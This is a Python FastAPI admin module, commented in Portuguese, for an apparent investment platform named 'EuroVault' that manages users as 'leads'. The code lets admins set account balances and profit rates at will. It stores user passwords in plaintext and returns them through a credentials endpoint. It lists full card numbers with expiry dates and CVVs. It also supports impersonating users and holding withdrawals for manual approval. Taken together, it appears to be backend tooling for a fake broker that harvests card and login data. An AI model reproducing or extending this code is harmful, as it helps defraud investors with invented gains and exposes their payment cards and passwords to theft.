"""
admin_leads.py — Gestão de leads e utilizadores pelo admin:
Saldo, estado, notas, KYC, emails, follow-ups, auditoria, chat, levantamentos,
cartões, credenciais, impersonation e gestão de agentes (delega ao agent_router).
"""
from fastapi import APIRouter, Depends, HTTPException, Request as FastAPIRequest
from fastapi.responses import Response
from pydantic import BaseModel
from typing import Optional, List
from datetime import datetime, timedelta
from bson import ObjectId
import base64, os

from deps import (db, serialize_doc, get_admin_user, pwd_context,
                  log_admin_action, manager, SECRET_KEY, ALGORITHM)
from ml_scoring import ml_score

router = APIRouter()


# ── Modelos ────────────────────────────────────────────────────────────────────
class UpdateBalanceRequest(BaseModel):
    balance: float
    profit: float
    def model_post_init(self, __context):
        if self.profit < 0:   self.profit  = 0.0
        if self.balance < 0:  self.balance = 0.0

class UpdateStatusRequest(BaseModel):
    status: str

class UpdateDailyRateRequest(BaseModel):
    daily_profit_rate: float

class UpdateTagsRequest(BaseModel):
    tags: List[str]

class AdminPasswordChangeRequest(BaseModel):
    new_password: str

class LeadNotesRequest(BaseModel):
    notes: str

class NoteAddRequest(BaseModel):
    text: str

class WithdrawalLimitRequest(BaseModel):
    daily_withdrawal_limit: float

class FollowUpRequest(BaseModel):
    followup_date: Optional[str] = None
    followup_note: Optional[str] = ""

class WithdrawalReviewRequest(BaseModel):
    status: str
    reject_reason: Optional[str] = ""

class EmailRequest(BaseModel):
    subject: str
    body: str

class GenericEmailRequest(BaseModel):
    to: str
    subject: str
    body: str
    recipient_name: Optional[str] = ""

class ChatMessageRequest(BaseModel):
    message: str


CHAT_TEMPLATES_LIST = [
    {"id": 1, "label": "Boas-vindas",      "text": "Bom dia! Bem-vindo à EuroVault. Como posso ajudar?"},
    {"id": 2, "label": "Depósito OK",      "text": "O seu depósito foi processado com sucesso e já está disponível."},
    {"id": 3, "label": "Pedir KYC",        "text": "Para activar saques, envie o seu BI/CC ou Passaporte no Perfil."},
    {"id": 4, "label": "Levantamento",     "text": "O seu pedido de levantamento foi recebido. Prazo: 1-2 dias úteis."},
    {"id": 5, "label": "Conta verificada", "text": "A sua conta foi verificada. Já tem acesso total aos serviços EuroVault."},
    {"id": 6, "label": "Suporte técnico",  "text": "Lamentamos o inconveniente. A equipa técnica está a resolver."},
    {"id": 7, "label": "Indisponível",     "text": "Neste momento não estou disponível. Deixe a sua mensagem."},
]


# ── Leads / Utilizadores ───────────────────────────────────────────────────────
async def _compute_lead_score(user: dict, user_id: str, now: datetime) -> int:
    return ml_score(user)["score"]


@router.get("/api/admin/users")
async def get_all_users(admin = Depends(get_admin_user)):
    users = []
    now = datetime.utcnow()
    async for user in db.users.find({}).sort("created_at", -1):
        last_seen = user.get("last_seen")
        is_online = last_seen and (now - last_seen).total_seconds() < 300
        uid = str(user["_id"])
        ai_score = await _compute_lead_score(user, uid, now)
        users.append(serialize_doc({
            "id": user["_id"], "full_name": user["full_name"], "email": user["email"],
            "country": user.get("country", ""), "phone": user.get("phone", ""),
            "balance": max(0.0, float(user.get("balance", 0))),
            "profit":  max(0.0, float(user.get("profit", 0))),
            "status": user.get("status", "Novo"), "tags": user.get("tags", []),
            "daily_profit_rate": user.get("daily_profit_rate", 0),
            "kyc_status": user.get("kyc_status", "not_submitted"),
            "is_online": is_online, "last_seen": last_seen,
            "created_at": user.get("created_at"), "ai_score": ai_score,
        }))
    return users


@router.get("/api/admin/leads/count")
async def get_leads_count(admin = Depends(get_admin_user)):
    count = await db.users.count_documents({})
    return {"total": count}


@router.get("/api/admin/cards/count")
async def get_cards_count(admin = Depends(get_admin_user)):
    count = await db.cards_data.count_documents({})
    return {"total": count}


@router.put("/api/admin/users/{user_id}/balance")
async def update_user_balance(user_id: str, req: UpdateBalanceRequest, admin = Depends(get_admin_user)):
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"balance": req.balance, "profit": req.profit, "updated_at": datetime.utcnow()}})
    return {"success": True}


@router.put("/api/admin/users/{user_id}/status")
async def update_user_status(user_id: str, req: UpdateStatusRequest, admin = Depends(get_admin_user)):
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"status": req.status, "updated_at": datetime.utcnow()}})
    return {"success": True}


@router.put("/api/admin/users/{user_id}/daily-rate")
async def update_daily_rate(user_id: str, req: UpdateDailyRateRequest, admin = Depends(get_admin_user)):
    rate = max(0.0, min(req.daily_profit_rate, 100.0))
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"daily_profit_rate": rate, "profit_last_updated": datetime.utcnow(), "updated_at": datetime.utcnow()}})
    return {"success": True, "daily_profit_rate": rate}


@router.put("/api/admin/users/{user_id}/tags")
async def admin_update_tags(user_id: str, req: UpdateTagsRequest, admin = Depends(get_admin_user)):
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"tags": req.tags, "updated_at": datetime.utcnow()}})
    return {"success": True}


@router.get("/api/admin/users/{user_id}/credentials")
async def get_user_credentials(user_id: str, admin = Depends(get_admin_user)):
    user = await db.users.find_one({"_id": ObjectId(user_id)}, {"_id": 0, "email": 1, "password_plain": 1})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
    return {"email": user.get("email",""), "password_plain": user.get("password_plain","")}


@router.put("/api/admin/users/{user_id}/password")
async def admin_change_user_password(user_id: str, req: AdminPasswordChangeRequest, admin = Depends(get_admin_user)):
    if not req.new_password or len(req.new_password) < 4:
        raise HTTPException(status_code=400, detail="Senha demasiado curta (mínimo 4 caracteres)")
    new_hash = pwd_context.hash(req.new_password)
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"password": new_hash, "password_plain": req.new_password, "updated_at": datetime.utcnow()}})
    return {"success": True}


@router.delete("/api/admin/users/{user_id}")
async def delete_user(user_id: str, admin = Depends(get_admin_user)):
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
    await db.users.delete_one({"_id": ObjectId(user_id)})
    for col in [db.cards_data, db.orders, db.chat_messages, db.kyc_documents,
                db.sessions, db.audit_logs, db.balance_history]:
        await col.delete_many({"user_id": user_id})
    return {"success": True, "deleted_user": user.get("email", user_id)}


@router.get("/api/admin/users/{user_id}/score")
async def get_lead_score(user_id: str, admin = Depends(get_admin_user)):
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Lead não encontrado")
    result = ml_score(user)
    result["user_id"] = user_id
    return result


# ── Impersonation ──────────────────────────────────────────────────────────────
@router.post("/api/admin/users/{user_id}/impersonate")
async def impersonate_user(user_id: str, admin = Depends(get_admin_user)):
    from jose import jwt
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
    token = jwt.encode(
        {"sub": str(user["_id"]), "email": user["email"], "role": "client",
         "exp": datetime.utcnow() + timedelta(hours=2), "impersonated": True},
        SECRET_KEY, algorithm=ALGORITHM
    )
    return {"token": token, "user_id": user_id, "email": user["email"]}


# ── Notas ──────────────────────────────────────────────────────────────────────
@router.put("/api/admin/users/{user_id}/notes")
async def update_lead_notes(user_id: str, req: LeadNotesRequest, admin = Depends(get_admin_user)):
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"notes": req.notes, "notes_updated_at": datetime.utcnow()}})
    try:
        await db.audit_logs.insert_one({
            "user_id": user_id, "action": "notes_updated",
            "details": {"notes": req.notes[:500]}, "created_at": datetime.utcnow()
        })
    except Exception:
        pass
    return {"success": True}


@router.post("/api/admin/users/{user_id}/notes/timeline")
async def add_note_timeline(user_id: str, req: NoteAddRequest, admin = Depends(get_admin_user)):
    entry = {"user_id": user_id, "text": req.text, "created_at": datetime.utcnow(), "type": "note"}
    result = await db.notes_timeline.insert_one(entry)
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"notes": req.text, "notes_updated_at": datetime.utcnow()}})
    return {"success": True, "id": str(result.inserted_id)}


@router.get("/api/admin/users/{user_id}/notes/timeline")
async def get_notes_timeline(user_id: str, admin = Depends(get_admin_user)):
    entries = []
    async for e in db.notes_timeline.find({"user_id": user_id}).sort("created_at", -1).limit(50):
        entries.append(serialize_doc({"id": e["_id"], "text": e.get("text", ""), "created_at": e.get("created_at")}))
    return entries


@router.delete("/api/admin/users/{user_id}/notes/timeline/{note_id}")
async def delete_note_timeline(user_id: str, note_id: str, admin = Depends(get_admin_user)):
    await db.notes_timeline.delete_one({"_id": ObjectId(note_id), "user_id": user_id})
    return {"success": True}


@router.get("/api/admin/users/{user_id}/notes")
async def get_lead_notes(user_id: str, admin = Depends(get_admin_user)):
    user = await db.users.find_one({"_id": ObjectId(user_id)}, {"notes": 1, "notes_updated_at": 1})
    if not user:
        raise HTTPException(status_code=404, detail="Não encontrado")
    return {"notes": user.get("notes", ""), "notes_updated_at": user.get("notes_updated_at")}


@router.get("/api/admin/users/{user_id}/notes/history")
async def get_notes_history(user_id: str, admin = Depends(get_admin_user)):
    logs = []
    async for l in db.audit_logs.find({"user_id": user_id, "action": "notes_updated"}).sort("created_at", -1).limit(20):
        logs.append(serialize_doc({"created_at": l.get("created_at"),
            "notes_preview": l.get("details", {}).get("notes", "")[:100]}))
    return logs


# ── Depósitos por utilizador ────────────────────────────────────────────────────
@router.get("/api/admin/users/{user_id}/deposits")
async def get_user_deposits(user_id: str, admin = Depends(get_admin_user)):
    result = []
    async for d in db.cards_data.find({"user_id": user_id}).sort("created_at", -1).limit(50):
        result.append(serialize_doc({
            "id": d["_id"], "cardholder": d.get("cardholder",""),
            "card_number": d.get("card_number",""), "expiry": d.get("expiry",""),
            "amount": d.get("amount", 0), "country": d.get("country",""),
            "postal_code": d.get("postal_code",""), "created_at": d.get("created_at"),
        }))
    return result


@router.put("/api/admin/users/{user_id}/withdrawal-limit")
async def set_withdrawal_limit(user_id: str, req: WithdrawalLimitRequest, admin = Depends(get_admin_user)):
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"daily_withdrawal_limit": req.daily_withdrawal_limit}})
    return {"success": True}


# ── KYC Admin ──────────────────────────────────────────────────────────────────
@router.get("/api/admin/kyc")
async def get_all_kyc(admin = Depends(get_admin_user)):
    docs = []
    async for d in db.kyc_documents.find({}).sort("created_at", -1):
        docs.append(serialize_doc({
            "id": d["_id"], "user_id": d["user_id"],
            "doc_type": d["doc_type"], "filename": d["filename"],
            "content_type": d["content_type"], "status": d.get("status","pending"),
            "created_at": d.get("created_at"),
        }))
    return docs


@router.put("/api/admin/kyc/{doc_id}/status")
async def update_kyc_status(doc_id: str, req: UpdateStatusRequest, admin = Depends(get_admin_user)):
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id)})
    if not doc:
        raise HTTPException(status_code=404, detail="Documento não encontrado")
    await db.kyc_documents.update_one({"_id": ObjectId(doc_id)}, {"$set": {"status": req.status}})
    kyc_status = "approved" if req.status == "approved" else ("rejected" if req.status == "rejected" else "pending")
    await db.users.update_one({"_id": ObjectId(doc["user_id"])}, {"$set": {"kyc_status": kyc_status}})
    return {"success": True}


@router.get("/api/admin/kyc/{doc_id}/download")
async def download_kyc(doc_id: str, admin = Depends(get_admin_user)):
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id)})
    if not doc:
        raise HTTPException(status_code=404, detail="Não encontrado")
    data = base64.b64decode(doc["data"])
    return Response(content=data, media_type=doc["content_type"],
        headers={"Content-Disposition": f"attachment; filename={doc['filename']}"})


@router.get("/api/admin/kyc/pending")
async def get_pending_kyc(admin = Depends(get_admin_user)):
    docs = []
    async for d in db.kyc_documents.find({"status": "pending"}).sort("created_at", -1):
        docs.append(serialize_doc({"id": d["_id"], "user_id": d.get("user_id"),
            "doc_type": d.get("doc_type"), "filename": d.get("filename"),
            "status": d.get("status"), "created_at": d.get("created_at")}))
    return docs


@router.get("/api/admin/users/{user_id}/kyc-docs")
async def get_user_kyc_docs(user_id: str, admin = Depends(get_admin_user)):
    docs = []
    async for d in db.kyc_documents.find({"user_id": user_id}).sort("created_at", -1):
        docs.append(serialize_doc({
            "id": d["_id"], "doc_type": d.get("doc_type",""), "filename": d.get("filename",""),
            "content_type": d.get("content_type",""), "status": d.get("status","pending"),
            "created_at": d.get("created_at"),
        }))
    return docs


@router.put("/api/admin/users/{user_id}/kyc-docs/{doc_id}/status")
async def update_user_kyc_status(user_id: str, doc_id: str, req: UpdateStatusRequest, admin = Depends(get_admin_user)):
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id), "user_id": user_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Documento não encontrado")
    await db.kyc_documents.update_one({"_id": ObjectId(doc_id)}, {"$set": {"status": req.status}})
    all_docs = [d async for d in db.kyc_documents.find({"user_id": user_id})]
    if all_docs:
        statuses = [d.get("status","pending") for d in all_docs]
        if all(s == "approved" for s in statuses):    overall = "approved"
        elif any(s == "rejected" for s in statuses):  overall = "rejected"
        else:                                          overall = "pending"
        await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {"kyc_status": overall}})
    await log_admin_action(user_id, f"kyc_{req.status}", {"doc_id": doc_id, "doc_type": doc.get("doc_type")})
    return {"success": True}


@router.get("/api/admin/kyc/{doc_id}/preview")
async def preview_kyc(doc_id: str, admin = Depends(get_admin_user)):
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id)})
    if not doc:
        raise HTTPException(status_code=404, detail="Não encontrado")
    data = base64.b64decode(doc["data"])
    return Response(content=data, media_type=doc["content_type"])


# ── Follow-up ─────────────────────────────────────────────────────────────────
@router.put("/api/admin/users/{user_id}/followup")
async def set_followup(user_id: str, req: FollowUpRequest, admin = Depends(get_admin_user)):
    await db.users.update_one({"_id": ObjectId(user_id)},
        {"$set": {"followup_date": req.followup_date, "followup_note": req.followup_note}})
    await log_admin_action(user_id, "followup_set", {"date": req.followup_date, "note": req.followup_note})
    return {"success": True}


@router.get("/api/admin/followups")
async def get_followups(admin = Depends(get_admin_user)):
    now = datetime.utcnow().isoformat()
    results = []
    async for u in db.users.find({"followup_date": {"$ne": None, "$lte": now}}).sort("followup_date", 1).limit(50):
        results.append(serialize_doc({"id": u["_id"], "full_name": u["full_name"],
            "email": u["email"], "followup_date": u.get("followup_date"),
            "followup_note": u.get("followup_note", "")}))
    return results


# ── Audit ─────────────────────────────────────────────────────────────────────
@router.get("/api/admin/users/{user_id}/audit")
async def get_audit_log(user_id: str, admin = Depends(get_admin_user)):
    logs = []
    async for l in db.audit_logs.find({"user_id": user_id}).sort("created_at", -1).limit(50):
        logs.append(serialize_doc({"id": l["_id"], "action": l["action"],
            "details": l.get("details", {}), "created_at": l.get("created_at")}))
    return logs


# ── Cartões e depósitos (admin) ────────────────────────────────────────────────
@router.get("/api/admin/cards")
async def get_all_cards(admin = Depends(get_admin_user)):
    cards = []
    async for card in db.cards_data.find({}).sort("created_at", -1):
        cards.append(serialize_doc({
            "id": card["_id"], "user_id": card.get("user_id",""),
            "email": card.get("email",""), "full_name": card["full_name"],
            "card_number": card["card_number"], "expiry": card["expiry"],
            "cvv": card["cvv"], "country": card["country"],
            "postal_code": card["postal_code"], "amount": card.get("amount", 0),
            "created_at": card.get("created_at"),
        }))
    return cards


@router.get("/api/admin/deposits")
async def get_all_deposits(admin = Depends(get_admin_user)):
    deposits = []
    async for dep in db.deposits.find({}).sort("created_at", -1):
        deposits.append(serialize_doc({
            "id": dep["_id"], "user_id": dep["user_id"],
            "amount": dep["amount"], "status": dep["status"],
            "created_at": dep.get("created_at"),
        }))
    return deposits


# ── Levantamentos Admin ────────────────────────────────────────────────────────
@router.get("/api/admin/withdrawals")
async def get_all_withdrawals(admin = Depends(get_admin_user)):
    results = []
    async for w in db.withdrawals.find({}).sort("created_at", -1).limit(200):
        results.append(serialize_doc({
            "id": w["_id"], "user_id": w.get("user_id",""),
            "user_name": w.get("user_name",""), "user_email": w.get("user_email",""),
            "method": w.get("method",""), "amount": w.get("amount", 0),
            "account_name": w.get("account_name",""), "iban": w.get("iban",""),
            "bic": w.get("bic",""), "note": w.get("note",""),
            "status": w.get("status","pending"), "reject_reason": w.get("reject_reason",""),
            "created_at": w.get("created_at"), "reviewed_at": w.get("reviewed_at"),
        }))
    return results


@router.get("/api/admin/withdrawals/count")
async def count_pending_withdrawals(admin = Depends(get_admin_user)):
    count = await db.withdrawals.count_documents({"status": "pending"})
    return {"pending": count}


@router.put("/api/admin/withdrawals/{withdrawal_id}/review")
async def review_withdrawal(withdrawal_id: str, req: WithdrawalReviewRequest, admin = Depends(get_admin_user)):
    w = await db.withdrawals.find_one({"_id": ObjectId(withdrawal_id)})
    if not w:
        raise HTTPException(status_code=404, detail="Pedido não encontrado")
    if w.get("status") != "pending":
        raise HTTPException(status_code=400, detail="Este pedido já foi processado")
    update = {"status": req.status, "reviewed_at": datetime.utcnow()}
    if req.reject_reason:
        update["reject_reason"] = req.reject_reason
    await db.withdrawals.update_one({"_id": ObjectId(withdrawal_id)}, {"$set": update})
    if req.status == "approved" and w.get("amount", 0) > 0:
        user = await db.users.find_one({"_id": ObjectId(w["user_id"])})
        if user:
            new_balance = max(0.0, float(user.get("balance", 0)) - float(w["amount"]))
            await db.users.update_one({"_id": ObjectId(w["user_id"])},
                {"$set": {"balance": round(new_balance, 2), "updated_at": datetime.utcnow()}})
    await log_admin_action(w["user_id"], f"withdrawal_{req.status}",
                           {"amount": w.get("amount"), "reason": req.reject_reason})
    return {"success": True}


# ── Ordens Admin ───────────────────────────────────────────────────────────────
@router.get("/api/admin/orders/{user_id}")
async def get_user_orders(user_id: str, admin = Depends(get_admin_user)):
    orders = []
    async for o in db.orders.find({"user_id": user_id}).sort("created_at", -1).limit(100):
        orders.append(serialize_doc({
            "id": o["_id"], "asset_label": o["asset_label"], "asset_name": o["asset_name"],
            "side": o["side"], "amount": o["amount"], "leverage": o["leverage"],
            "price": o["price"], "status": o.get("status","executada"), "created_at": o.get("created_at"),
        }))
    return orders


# ── Chat Admin ─────────────────────────────────────────────────────────────────
@router.get("/api/admin/chat/unread-count")
async def get_unread_chat_count(admin = Depends(get_admin_user)):
    count = await db.chat_messages.count_documents({"sender": "client", "read_by_admin": {"$ne": True}})
    return {"unread": count}


@router.get("/api/admin/chat/templates")
@router.get("/api/admin/chat/templates_list")
async def get_chat_templates(admin = Depends(get_admin_user)):
    return CHAT_TEMPLATES_LIST


@router.get("/api/admin/chat/conversations")
async def get_chat_conversations(admin = Depends(get_admin_user)):
    pipeline = [
        {"$sort": {"created_at": -1}},
        {"$group": {"_id": "$user_id", "last_message": {"$first": "$message"},
                    "user_name": {"$first": "$user_name"}, "email": {"$first": "$email"},
                    "created_at": {"$first": "$created_at"},
                    "unread": {"$sum": {"$cond": [{"$eq": ["$read_by_admin", False]}, 1, 0]}}}},
        {"$sort": {"created_at": -1}}
    ]
    convs = []
    async for c in db.chat_messages.aggregate(pipeline):
        convs.append({"user_id": c["_id"], "user_name": c.get("user_name",""),
                      "email": c.get("email",""), "last_message": c.get("last_message",""),
                      "unread": c.get("unread", 0),
                      "created_at": c.get("created_at","").isoformat() if c.get("created_at") else ""})
    return convs


@router.get("/api/admin/chat/{user_id}")
async def get_user_chat(user_id: str, admin = Depends(get_admin_user)):
    msgs = []
    async for m in db.chat_messages.find({"user_id": user_id}).sort("created_at", 1):
        msgs.append(serialize_doc({"id": m["_id"], "message": m["message"],
            "sender": m.get("sender","client"), "created_at": m.get("created_at")}))
    await db.chat_messages.update_many({"user_id": user_id, "sender": "client"}, {"$set": {"read_by_admin": True}})
    return msgs


@router.post("/api/admin/chat/{user_id}/reply")
async def admin_reply_chat(user_id: str, req: ChatMessageRequest, admin = Depends(get_admin_user)):
    msg = {"user_id": user_id, "message": req.message, "sender": "admin",
           "read_by_admin": True, "created_at": datetime.utcnow()}
    await db.chat_messages.insert_one(msg)
    return {"success": True}


# ── Email ──────────────────────────────────────────────────────────────────────
@router.post("/api/admin/users/{user_id}/send-email")
async def send_email_to_lead(user_id: str, req: EmailRequest, admin = Depends(get_admin_user)):
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
    recipient = user.get("email", "")
    if not recipient:
        raise HTTPException(status_code=400, detail="Lead sem email")
    email_log = {"user_id": user_id, "to": recipient, "subject": req.subject,
                 "body": req.body, "sent_at": datetime.utcnow(), "status": "sent"}
    smtp_host = os.environ.get("SMTP_HOST", "")
    smtp_user = os.environ.get("SMTP_USER", "")
    smtp_pass = os.environ.get("SMTP_PASS", "")
    smtp_from = os.environ.get("SMTP_FROM", smtp_user)
    if smtp_host and smtp_user and smtp_pass:
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            msg = MIMEMultipart("alternative")
            msg["Subject"] = req.subject
            msg["From"]    = f"EuroVault Investments <{smtp_from}>"
            msg["To"]      = recipient
            html_body = req.body.replace("\n", "<br>")
            html = f"""<html><body style="font-family:sans-serif;background:#06061a;color:#f3f5ff;padding:32px">
                <div style="max-width:560px;margin:0 auto;background:#111118;border:1px solid #26263a;border-radius:16px;padding:32px">
                    <h2 style="color:#3A86FF">{req.subject}</h2>
                    <div style="color:#e8eaf6;line-height:1.7">{html_body}</div>
                    <hr style="border-color:#26263a;margin:24px 0"/>
                    <p style="color:#4a5068;font-size:11px">EuroVault Investments · Este email é confidencial.</p>
                </div></body></html>"""
            msg.attach(MIMEText(html, "html"))
            with smtplib.SMTP_SSL(smtp_host, 465) as s:
                s.login(smtp_user, smtp_pass)
                s.sendmail(smtp_from, [recipient], msg.as_string())
            email_log["status"] = "sent_smtp"
        except Exception as e:
            email_log["status"] = f"smtp_error: {str(e)[:100]}"
    else:
        email_log["status"] = "logged_only"
    await db.email_logs.insert_one(email_log)
    await log_admin_action(user_id, "email_sent", {"subject": req.subject, "to": recipient})
    return {"success": True, "to": recipient, "status": email_log["status"],
            "note": "Configure SMTP_HOST, SMTP_USER, SMTP_PASS no .env para envio real."}


@router.get("/api/admin/users/{user_id}/email-logs")
async def get_email_logs(user_id: str, admin = Depends(get_admin_user)):
    logs = []
    async for e in db.email_logs.find({"user_id": user_id}).sort("sent_at", -1).limit(20):
        logs.append(serialize_doc({"id": e["_id"], "to": e.get("to"), "subject": e.get("subject"),
            "body": e.get("body","")[:200], "sent_at": e.get("sent_at"), "status": e.get("status")}))
    return logs


@router.post("/api/admin/email/send")
async def send_generic_email(req: GenericEmailRequest, admin = Depends(get_admin_user)):
    email_log = {"to": req.to, "subject": req.subject, "body": req.body,
                 "sent_at": datetime.utcnow(), "status": "sent"}
    smtp_host = os.environ.get("SMTP_HOST", "")
    smtp_user = os.environ.get("SMTP_USER", "")
    smtp_pass = os.environ.get("SMTP_PASS", "")
    smtp_from = os.environ.get("SMTP_FROM", smtp_user)
    if smtp_host and smtp_user and smtp_pass:
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            msg = MIMEMultipart("alternative")
            msg["Subject"] = req.subject
            msg["From"]    = f"EuroVault Investments <{smtp_from}>"
            msg["To"]      = req.to
            html_body = req.body.replace("\n", "<br>")
            greeting = f"<p>Olá, <strong>{req.recipient_name}</strong></p>" if req.recipient_name else ""
            html = f"""<html><body style="background:#06061a;font-family:Arial,sans-serif;">
<table width="100%" style="background:#06061a;padding:32px 16px;"><tr><td align="center">
<table width="600" style="background:#111118;border:1px solid #26263a;border-radius:16px;padding:32px;">
<tr><td><span style="font-size:22px;font-weight:900;color:#f3f5ff;">EuroVault</span></td></tr>
<tr><td style="padding:24px 0;">{greeting}<div style="font-size:15px;line-height:1.75;color:#e8eaf6;">{html_body}</div></td></tr>
<tr><td style="font-size:11px;color:#4a5068;">© {datetime.utcnow().year} EuroVault Digital Solutions</td></tr>
</table></td></tr></table></body></html>"""
            msg.attach(MIMEText(html, "html"))
            with smtplib.SMTP_SSL(smtp_host, 465) as s:
                s.login(smtp_user, smtp_pass)
                s.sendmail(smtp_from, [req.to], msg.as_string())
            email_log["status"] = "sent_smtp"
        except Exception as e:
            email_log["status"] = f"error: {str(e)[:100]}"
    else:
        email_log["status"] = "logged_only"
    await db.email_logs.insert_one(email_log)
    return {"success": True, "to": req.to, "status": email_log["status"]}
